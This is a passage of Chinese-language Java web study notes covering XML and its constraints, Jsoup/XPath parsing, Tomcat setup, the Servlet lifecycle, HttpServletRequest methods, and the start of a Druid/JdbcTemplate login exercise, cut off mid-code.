.xml</li><li>xml第一行必须定义为文档声明</li><li>xml文档中有且仅有一个根标签</li><li>属性值必须使用引号(单双都可)引起来</li><li>标签必须正确关闭</li><li>xml标签名称区分大小写</li></ol></li><li><p>快速入门：</p>  <?xml version='1.0' ?>  <users>      <user id='1'>          <name>zhangsan</name>          <age>23</age>          <gender>male</gender>          <br/>      </user>                                                          <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">user</span> <span class="attr">id</span>=<span class="string">&#x27;2&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>lisi<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">age</span>&gt;</span>24<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">gender</span>&gt;</span>female<span class="tag">&lt;/<span class="name">gender</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>  </users></li><li><p>组成部分：</p><ol><li><p>文档声明</p><ol><li>格式：<?xml 属性列表 ?></li><li>属性列表：<ul><li>version：版本号，必须的属性</li><li>encoding：编码方式。告知解析引擎当前文档使用的字符集，默认值：ISO-8859-1</li><li>standalone：是否独立<ul><li>取值：<ul><li>yes：不依赖其他文件</li><li>no：依赖其他文件</li></ul></li></ul></li></ul></li></ol></li><li><p>指令(了解)：结合css的</p><ul><li><?xml-stylesheet type="text/css" href="a.css" ?></li></ul></li><li><p>标签：标签名称自定义的</p><ul><li>规则：<ul><li>名称可以包含字母、数字以及其他的字符 </li><li>名称不能以数字或者标点符号开始 </li><li>名称不能以字母 xml（或者 XML、Xml 等等）开始 </li><li>名称不能包含空格 </li></ul></li></ul></li><li><p>属性：</p><p> id属性值唯一</p></li><li><p>文本：</p></li></ol><ul><li><p>CDATA区：在该区域中的数据会被原样展示</p><ul><li>格式：  <![CDATA[ 数据 ]]></li></ul></li><li><p>约束：规定xml文档的书写规则</p><ul><li><p>作为框架的使用者(程序员)：</p><ol><li>能够在xml中引入约束文档</li><li>能够简单的读懂约束文档</li></ol></li><li><p>分类：</p><ol><li><p>DTD:一种简单的约束技术</p></li><li><p>Schema:一种复杂的约束技术</p><p>DTD：</p></li></ol><ul><li><p>引入dtd文档到xml文档中</p><pre><code>* 内部dtd：将约束规则定义在xml文档中* 外部dtd：将约束的规则定义在外部的dtd文件中    * 本地：&lt;!DOCTYPE 根标签名 SYSTEM &quot;dtd文件的位置&quot;&gt;    * 网络：&lt;!DOCTYPE 根标签名 PUBLIC &quot;dtd文件名字&quot; &quot;dtd文件的位置URL&quot;&gt;</code></pre><p>Schema:</p><pre><code>* 引入：        1.填写xml文档的根元素        2.引入xsi前缀.  xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;        3.引入xsd文件命名空间.  xsi:schemaLocation=&quot;http://www.itcast.cn/xml  student.xsd&quot;        4.为每一个xsd约束声明一个前缀,作为标识  xmlns=&quot;http://www.itcast.cn/xml&quot; </code></pre><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">students</span>   <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns</span>=<span class="string">&quot;http://www.itcast.cn/xml&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.itcast.cn/xml  student.xsd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul></li></ul></blockquote><blockquote><ul><li>xml常见的解析器：<ol><li>JAXP：sun公司提供的解析器，支持dom和sax两种思想</li><li>DOM4J：一款非常优秀的解析器</li><li>Jsoup：jsoup 是一款Java 的HTML解析器，可直接解析某个URL地址、HTML文本内容。它提供了一套非常省力的API，可通过DOM，CSS以及类似于jQuery的操作方法来取出和操作数据。</li><li>PULL：Android操作系统内置的解析器，sax方式的。</li></ol><ul><li>Jsoup：jsoup 是一款Java 的HTML解析器，可直接解析某个URL地址、HTML文本内容。它提供了一套非常省力的API，可通过DOM，CSS以及类似于jQuery的操作方法来取出和操作数据。<ul><li>快速入门：<ul><li>步骤：<ol><li>导入jar包</li><li>获取Document对象</li><li>获取对应的标签Element对象</li><li>获取数据</li></ol></li></ul></li></ul>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2.1获取student.xml的path</span></span><br><span class="line">     String path = JsoupDemo1.class.getClassLoader().getResource(<span class="string">&quot;student.xml&quot;</span>).getPath();</span><br><span class="line">     <span class="comment">//2.2解析xml文档，加载文档进内存，获取dom树---&gt;Document</span></span><br><span class="line">     Document document = Jsoup.parse(<span class="keyword">new</span> File(path), <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">     <span class="comment">//3.获取元素对象 Element</span></span><br><span class="line">     Elements elements = document.getElementsByTag(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">     System.out.println(elements.size());</span><br><span class="line">     <span class="comment">//3.1获取第一个name的Element对象</span></span><br><span class="line">     Element element = elements.get(<span class="number">0</span>);</span><br><span class="line">     <span class="comment">//3.2获取数据</span></span><br><span class="line">     String name = element.text();</span><br><span class="line">     System.out.println(name);</span><br></pre></td></tr></table></figure><ul><li>对象的使用：<pre><code>  1. Jsoup：工具类，可以解析html或xml文档，返回Document      * parse：解析html或xml文档，返回Document          * parse(File in, String charsetName)：解析xml或html文件的。          * parse(String html)：解析xml或html字符串          * parse(URL url, int timeoutMillis)：通过网络路径获取指定的html或xml的文档对象  可以用来爬虫  2. Document：文档对象。代表内存中的dom树      * 获取Element对象          * getElementById(String id)：根据id属性值获取唯一的element对象          * getElementsByTag(String tagName)：根据标签名称获取元素对象集合          * getElementsByAttribute(String key)：根据属性名称获取元素对象集合          * getElementsByAttributeValue(String key, String value)：根据对应的属性名和属性值获取元素对象集合  3. Elements：元素Element对象的集合。可以当做 ArrayList&lt;Element&gt;来使用  4. Element：元素对象      1. 获取子元素对象          * getElementById(String id)：根据id属性值获取唯一的element对象          * getElementsByTag(String tagName)：根据标签名称获取元素对象集合          * getElementsByAttribute(String key)：根据属性名称获取元素对象集合          * getElementsByAttributeValue(String key, String value)：根据对应的属性名和属性值获取元素对象集合  2. 获取属性值      * String attr(String key)：根据属性名称获取属性值  3. 获取文本内容      * String text():获取文本内容      * String html():获取标签体的所有内容(包括字标签的字符串内容)                                                                                                                                                                                                    Node：节点对象  * 是Document和Element的父类</code></pre></li></ul></li></ul>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">* 快捷查询方式：</span><br><span class="line"><span class="number">1.</span> selector:选择器</span><br><span class="line">* 使用的方法：<span class="function">Elements<span class="title">select</span><span class="params">(String cssQuery)</span></span></span><br><span class="line"><span class="function">* 语法：参考Selector类中定义的语法</span></span><br><span class="line"><span class="function">2. XPath：XPath即为XML路径语言，它是一种用来确定XML（标准通用标记语言的子集）文档中某部分位置的语言</span></span><br><span class="line"><span class="function">* 使用Jsoup的Xpath需要额外导入jar包。</span></span><br><span class="line"><span class="function">* 查询w3cshool参考手册，使用xpath的语法完成查询</span></span><br><span class="line"><span class="function">* 代码：</span></span><br><span class="line"><span class="function"><span class="comment">//1.获取student.xml的path</span></span></span><br><span class="line"><span class="function">        String path </span>= JsoupDemo6.class.getClassLoader().getResource(<span class="string">&quot;student.xml&quot;</span>).getPath();</span><br><span class="line">        <span class="comment">//2.获取Document对象</span></span><br><span class="line">        Document document = Jsoup.parse(<span class="keyword">new</span> File(path), <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.根据document对象，创建JXDocument对象</span></span><br><span class="line">        JXDocument jxDocument = <span class="keyword">new</span> JXDocument(document);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.结合xpath语法查询</span></span><br><span class="line">        <span class="comment">//4.1查询所有student标签</span></span><br><span class="line">        List&lt;JXNode&gt; jxNodes = jxDocument.selN(<span class="string">&quot;//student&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (JXNode jxNode : jxNodes) &#123;</span><br><span class="line">            System.out.println(jxNode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;--------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.2查询所有student标签下的name标签</span></span><br><span class="line">        List&lt;JXNode&gt; jxNodes2 = jxDocument.selN(<span class="string">&quot;//student/name&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (JXNode jxNode : jxNodes2) &#123;</span><br><span class="line">            System.out.println(jxNode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;--------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.3查询student标签下带有id属性的name标签</span></span><br><span class="line">        List&lt;JXNode&gt; jxNodes3 = jxDocument.selN(<span class="string">&quot;//student/name[@id]&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (JXNode jxNode : jxNodes3) &#123;</span><br><span class="line">            System.out.println(jxNode);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;--------------------&quot;</span>);</span><br><span class="line">        <span class="comment">//4.4查询student标签下带有id属性的name标签 并且id属性值为itcast</span></span><br><span class="line"></span><br><span class="line">        List&lt;JXNode&gt; jxNodes4 = jxDocument.selN(<span class="string">&quot;//student/name[@id=&#x27;itcast&#x27;]&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (JXNode jxNode : jxNodes4) &#123;</span><br><span class="line">            System.out.println(jxNode);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></li></ul></blockquote><h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h3><blockquote><ul><li>常见的java相关的web服务器软件：<ul><li>webLogic：oracle公司，大型的JavaEE服务器，支持所有的JavaEE规范，收费的。</li><li>webSphere：IBM公司，大型的JavaEE服务器，支持所有的JavaEE规范，收费的。</li><li>JBOSS：JBOSS公司的，大型的JavaEE服务器，支持所有的JavaEE规范，收费的。</li><li>Tomcat：Apache基金组织，中小型的JavaEE服务器，仅仅支持少量的JavaEE规范servlet/jsp。开源的，免费的。</li></ul>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">* JavaEE：Java语言在企业级开发中使用的技术规范的总和，一共规定了13项大的规范</span><br><span class="line"></span><br><span class="line">* Tomcat：web服务器软件</span><br><span class="line">1. 下载：http:&#x2F;&#x2F;tomcat.apache.org&#x2F;</span><br><span class="line">2. 安装：解压压缩包即可。</span><br><span class="line">* 注意：安装目录建议不要有中文和空格</span><br><span class="line">3. 卸载：删除目录就行了</span><br><span class="line">4. 启动：</span><br><span class="line">* bin&#x2F;startup.bat ,双击运行该文件即可</span><br><span class="line">* 访问：浏览器输入：http:&#x2F;&#x2F;localhost:8080 回车访问自己</span><br><span class="line">  http:&#x2F;&#x2F;别人的ip:8080 访问别人</span><br><span class="line"></span><br><span class="line">* 可能遇到的问题：</span><br><span class="line">1. 黑窗口一闪而过：</span><br><span class="line">* 原因： 没有正确配置JAVA_HOME环境变量</span><br><span class="line">* 解决方案：正确配置JAVA_HOME环境变量</span><br><span class="line"></span><br><span class="line">2. 启动报错：</span><br><span class="line">1. 暴力：找到占用的端口号，并且找到对应的进程，杀死该进程</span><br><span class="line">* netstat -ano</span><br><span class="line">2. 温柔：修改自身的端口号</span><br><span class="line">* conf&#x2F;server.xml</span><br><span class="line">* &lt;Connector port&#x3D;&quot;8888&quot; protocol&#x3D;&quot;HTTP&#x2F;1.1&quot;</span><br><span class="line">               connectionTimeout&#x3D;&quot;20000&quot;</span><br><span class="line">               redirectPort&#x3D;&quot;8445&quot; &#x2F;&gt;</span><br><span class="line">* 一般会将tomcat的默认端口号修改为80。80端口号是http协议的默认端口号。</span><br><span class="line">* 好处：在访问时，就不用输入端口号</span><br><span class="line">5. 关闭：</span><br><span class="line">1. 正常关闭：</span><br><span class="line">* bin&#x2F;shutdown.bat</span><br><span class="line">* ctrl+c</span><br><span class="line">2. 强制关闭：</span><br><span class="line">* 点击启动窗口的×</span><br><span class="line">6. 配置:</span><br><span class="line">* 部署项目的方式：</span><br><span class="line">1. 直接将项目放到webapps目录下即可。</span><br><span class="line">* &#x2F;hello：项目的访问路径--&gt;虚拟目录</span><br><span class="line">* 简化部署：将项目打成一个war包，再将war包放置到webapps目录下。</span><br><span class="line">* war包会自动解压缩</span><br><span class="line"></span><br><span class="line">2. 配置conf&#x2F;server.xml文件</span><br><span class="line">在&lt;Host&gt;标签体中配置</span><br><span class="line">&lt;Context docBase&#x3D;&quot;D:\hello&quot; path&#x3D;&quot;&#x2F;hehe&quot; &#x2F;&gt;</span><br><span class="line">* docBase:项目存放的路径</span><br><span class="line">* path：虚拟目录</span><br><span class="line"></span><br><span class="line">3. 在conf\Catalina\localhost创建任意名称的xml文件。在文件中编写</span><br><span class="line">&lt;Context docBase&#x3D;&quot;D:\hello&quot; &#x2F;&gt;</span><br><span class="line">* 虚拟目录：xml文件的名称</span><br><span class="line"></span><br><span class="line">* 静态项目和动态项目：</span><br><span class="line">* 目录结构</span><br><span class="line">* java动态项目的目录结构：</span><br><span class="line">-- 项目的根目录</span><br><span class="line">-- WEB-INF目录：</span><br><span class="line">-- web.xml：web项目的核心配置文件</span><br><span class="line">-- classes目录：放置字节码文件的目录</span><br><span class="line">-- lib目录：放置依赖的jar包</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul></blockquote><h3 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h3><blockquote><p>server  applet</p><p>Servlet 就是一个接口，定义了浏览器访问到的规则</p><p>快速入门：</p><ol><li><p>创建JavaEE项目</p></li><li><p>定义一个类，实现Servlet接口</p><ul><li>public class ServletDemo1 implements Servlet</li></ul></li><li><p>实现接口中的抽象方法</p></li><li><p>配置Servlet</p><p>  在web.xml中配置：</p> <!--配置Servlet --> <servlet>     <servlet-name>demo1</servlet-name>     <servlet-class>cn.itcast.web.servlet.ServletDemo1</servlet-class> </servlet>          <servlet-mapping>     <servlet-name>demo1</servlet-name>     <url-pattern>/demo1</url-pattern> </servlet-mapping></li></ol><ul><li><p>执行原理：</p><ol><li>当服务器接受到客户端浏览器的请求后，会解析请求URL路径，获取访问的Servlet的资源路径</li><li>查找web.xml文件，是否有对应的<url-pattern>标签体内容。</li><li>如果有，则在找到对应的<servlet-class>全类名</li><li>tomcat会将字节码文件加载进内存，并且创建其对象</li><li>调用其方法</li></ol></li><li><p>Servlet中的生命周期方法：</p><ol><li>被创建：执行init方法，只执行一次</li></ol><ul><li><p>Servlet什么时候被创建？</p><ul><li><p>默认情况下，第一次被访问时，Servlet被创建</p></li><li><p>可以配置执行Servlet的创建时机。</p><ul><li><p>在<servlet>标签下配置</p><ol><li><p>第一次被访问时，创建</p><pre><code>   * &lt;load-on-startup&gt;的值为负数</code></pre><p>   在服务器启动时，创建</p><ul><li><load-on-startup>的值为0或正整数</li></ul></li></ol></li></ul></li></ul></li></ul></li></ul><pre><code>    * Servlet的init方法，只执行一次，说明一个Servlet在内存中只存在一个对象，Servlet是单例的        * 多个用户同时访问时，可能存在线程安全问题。        * 解决：尽量不要在Servlet中定义成员变量。即使定义了成员变量，也不要对修改值                                    2. 提供服务：执行service方法，执行多次    * 每次访问Servlet时，Service方法都会被调用一次。3. 被销毁：执行destroy方法，只执行一次    * Servlet被销毁时执行。服务器关闭时，Servlet被销毁    * 只有服务器正常关闭时，才会执行destroy方法。    * destroy方法在Servlet被销毁之前执行，一般用于释放资源<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">* Servlet3<span class="number">.0</span>：</span><br><span class="line">* 好处：</span><br><span class="line">* 支持注解配置。可以不需要web.xml了。</span><br><span class="line">                                    </span><br><span class="line">* 步骤：</span><br><span class="line"><span class="number">1.</span> 创建JavaEE项目，选择Servlet的版本<span class="number">3.0</span>以上，可以不创建web.xml</span><br><span class="line"><span class="number">2.</span> 定义一个类，实现Servlet接口</span><br><span class="line"><span class="number">3.</span> 复写方法</span><br><span class="line"><span class="number">4.</span> 在类上使用<span class="meta">@WebServlet</span>注解，进行配置</span><br><span class="line">* <span class="meta">@WebServlet(&quot;资源路径&quot;)</span></span><br><span class="line"><span class="meta">@Target(&#123;ElementType.TYPE&#125;)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> WebServlet &#123;</span><br><span class="line">    <span class="function">String <span class="title">name</span><span class="params">()</span> <span class="keyword">default</span> &quot;&quot;</span>;<span class="comment">//相当于&lt;Servlet-name&gt;</span></span><br><span class="line">                                    </span><br><span class="line">    String[] value() <span class="keyword">default</span> &#123;&#125;;<span class="comment">//代表urlPatterns()属性配置</span></span><br><span class="line">                                    </span><br><span class="line">    String[] urlPatterns() <span class="keyword">default</span> &#123;&#125;;<span class="comment">//相当于&lt;url-pattern&gt;</span></span><br><span class="line">                                    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">loadOnStartup</span><span class="params">()</span> <span class="keyword">default</span> -1</span>;<span class="comment">//相当于&lt;load-on-startup&gt;</span></span><br><span class="line">                                    </span><br><span class="line">    WebInitParam[] initParams() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line">                                    </span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">asyncSupported</span><span class="params">()</span> <span class="keyword">default</span> <span class="keyword">false</span></span>;</span><br><span class="line">                                    </span><br><span class="line">    <span class="function">String <span class="title">smallIcon</span><span class="params">()</span> <span class="keyword">default</span> &quot;&quot;</span>;</span><br><span class="line">                                    </span><br><span class="line">    <span class="function">String <span class="title">largeIcon</span><span class="params">()</span> <span class="keyword">default</span> &quot;&quot;</span>;</span><br><span class="line">                                    </span><br><span class="line">    <span class="function">String <span class="title">description</span><span class="params">()</span> <span class="keyword">default</span> &quot;&quot;</span>;</span><br><span class="line">                                    </span><br><span class="line">    <span class="function">String <span class="title">displayName</span><span class="params">()</span> <span class="keyword">default</span> &quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>                                    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">idead与tomcat的相关配置</span><br><span class="line">1. IDEA会为每一个tomcat部署的项目单独建立一份配置文件</span><br><span class="line">* 查看控制台的log：Using CATALINA_BASE:   &quot;C:\Users\fqy\.IntelliJIdea2018.1\system\tomcat\_itcast&quot;</span><br><span class="line">                                    </span><br><span class="line">2. 工作空间项目    和     tomcat部署的web项目</span><br><span class="line">* tomcat真正访问的是“tomcat部署的web项目”，&quot;tomcat部署的web项目&quot;对应着&quot;工作空间项目&quot; 的web目录下的所有资源</span><br><span class="line">* WEB-INF目录下的资源不能被浏览器直接访问。</span><br><span class="line">3. 断点调试：使用&quot;小虫子&quot;启动 dubug 启动</span><br></pre></td></tr></table></figure></code></pre></blockquote><h4 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h4><pre><code>1. request对象和response对象的原理    1. request和response对象是由服务器创建的。我们来使用它们    2. request对象是来获取请求消息，response对象是来设置响应消息2. request对象继承体系结构：        ServletRequest        --    接口        |    继承    HttpServletRequest    -- 接口        |    实现    org.apache.catalina.connector.RequestFacade 类(tomcat)3. request功能：    1. 获取请求消息数据        1. 获取请求行数据            * GET /day14/demo1?name=zhangsan HTTP/1.1            * 方法：                1. 获取请求方式 ：GET                    * String getMethod()                  2. (*)获取虚拟目录：/day14                    * String getContextPath()                3. 获取Servlet路径: /demo1                    * String getServletPath()                4. 获取get方式请求参数：name=zhangsan                    * String getQueryString()                5. (*)获取请求URI：/day14/demo1                    * String getRequestURI():        /day14/demo1                    * StringBuffer getRequestURL()  :http://localhost/day14/demo1                    * URL:统一资源定位符 ： http://localhost/day14/demo1    中华人民共和国                    * URI：统一资源标识符 : /day14/demo1                    共和国                                6. 获取协议及版本：HTTP/1.1                    * String getProtocol()                7. 获取客户机的IP地址：                    * String getRemoteAddr()                        2. 获取请求头数据            * 方法：                * (*)String getHeader(String name):通过请求头的名称获取请求头的值                * Enumeration&lt;String&gt; getHeaderNames():获取所有的请求头名称                    3. 获取请求体数据:            * 请求体：只有POST请求方式，才有请求体，在请求体中封装了POST请求的请求参数            * 步骤：                1. 获取流对象                    *  BufferedReader getReader()：获取字符输入流，只能操作字符数据                    *  ServletInputStream getInputStream()：获取字节输入流，可以操作所有类型数据                        * 在文件上传知识点后讲解                2. 再从流对象中拿数据</code></pre><p>​                </p><pre><code>    2. 其他功能：        1. 获取请求参数通用方式：不论get还是post请求方式都可以使用下列方法来获取请求参数            1. String getParameter(String name):根据参数名称获取参数值    username=zs&amp;password=123            2. String[] getParameterValues(String name):根据参数名称获取参数值的数组  hobby=xx&amp;hobby=game            3. Enumeration&lt;String&gt; getParameterNames():获取所有请求的参数名称            4. Map&lt;String,String[]&gt; getParameterMap():获取所有参数的map集合            * 中文乱码问题：                * get方式：tomcat 8 已经将get方式乱码问题解决了                * post方式：会乱码                    * 解决：在获取参数前，设置request的编码request.setCharacterEncoding(&quot;utf-8&quot;)        2. 请求转发：一种在服务器内部的资源跳转方式            1. 步骤：                1. 通过request对象获取请求转发器对象：RequestDispatcher getRequestDispatcher(String path)                2. 使用RequestDispatcher对象来进行转发：forward(ServletRequest request, ServletResponse response)             2. 特点：                1. 浏览器地址栏路径不发生变化                2. 只能转发到当前服务器内部资源中。                3. 转发是一次请求(f12发现只有一次请求，多个资源中使用同一个请求)        3. 共享数据：            * 域对象：一个有作用范围的对象，可以在范围内共享数据            * request域：代表一次请求的范围，一般用于请求转发的多个资源中共享数据 记住是请求转发            * 方法：                1. void setAttribute(String name,Object obj):存储数据                2. Object getAttitude(String name):通过键获取值                3. void removeAttribute(String name):通过键移除键值对        4. 获取ServletContext：            * ServletContext getServletContext()</code></pre><blockquote><p>BeanUtils</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String,String[]&gt; map=req.getParamenterMap();</span><br><span class="line">User loginUser=<span class="keyword">new</span> User();</span><br><span class="line">BeanUtils.populate(loginUsers,map)<span class="comment">//可以将post里的所有参数自动放进实体类里</span></span><br><span class="line">    </span><br><span class="line">    </span><br></pre></td></tr></table></figure></blockquote><h4 id="案例：用户登录"><a href="#案例：用户登录" class="headerlink" title="案例：用户登录"></a>案例：用户登录</h4><pre><code>* 用户登录案例需求：    1.编写login.html登录页面        username &amp; password 两个输入框    2.使用Druid数据库连接池技术,操作mysql，day14数据库中user表    3.使用JdbcTemplate技术封装JDBC    4.登录成功跳转到SuccessServlet展示：登录成功！用户名,欢迎您    5.登录失败跳转到FailServlet展示：登录失败，用户名或密码错误</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">* 分析</span><br><span class="line"></span><br><span class="line">* 开发步骤</span><br><span class="line">1. 创建项目，导入html页面，配置文件，jar包</span><br><span class="line">2. 创建数据库环境</span><br><span class="line">CREATE DATABASE day14;</span><br><span class="line">USE day14;</span><br><span class="line">CREATE TABLE USER(</span><br><span class="line"></span><br><span class="line">id INT PRIMARY KEY AUTO_INCREMENT,</span><br><span class="line">username VARCHAR(32) UNIQUE NOT NULL,</span><br><span class="line">PASSWORD VARCHAR(32) NOT NULL</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">3. 创建包cn.itcast.domain,创建类User</span><br><span class="line">package cn.itcast.domain;</span><br><span class="line">&#x2F;**</span><br><span class="line"> * 用户的实体类</span><br><span class="line"> *&#x2F;</span><br><span class="line">public class User &#123;</span><br><span class="line"></span><br><span class="line">    private int id;</span><br><span class="line">    private String username;</span><br><span class="line">    private String password;</span><br></pre></td></tr></table></figure><pre><code>            public int getId() &#123;                return id;            &#125;                    public void setId(int id) &#123;                this.id = id;            &#125;                    public String getUsername() &#123;                return username;            &#125;                    public void setUsername(String username) &#123;                this.username = username;            &#125;                    public String getPassword() &#123;                return password;            &#125;                    public void setPassword(String password) &#123;                this.password = password;            &#125;                    @Override            public String toString() &#123;                return &quot;User&#123;&quot; +                        &quot;id=&quot; + id +                        &quot;, username=&#39;&quot; + username + &#39;\&#39;&#39; +                        &quot;, password=&#39;&quot; + password + &#39;\&#39;&#39; +                        &#39;&#125;&#39;;            &#125;        &#125;    4. 创建包cn.itcast.util,编写工具类JDBCUtils        package cn.itcast.util;        import com.alibaba.druid.pool.DruidDataSourceFactory;                import javax.sql.DataSource;        import javax.xml.crypto.Data;        import java.io.IOException;        import java.io.InputStream;        import java.sql.Connection;        import java.sql.SQLException;        import java.util.Properties;                /**         * JDBC工具类 使用Durid连接池         */        public class JDBCUtils &#123;                    private static DataSource ds ;                    static &#123;                        try &#123;                    //1.加载配置文件                    Properties pro = new Properties();                    //使用ClassLoader加载配置文件，获取字节输入流                    InputStream is = JDBCUtils.class.getClassLoader().getResourceAsStream(&quot;druid.properties&quot;);                    pro.load(is);                            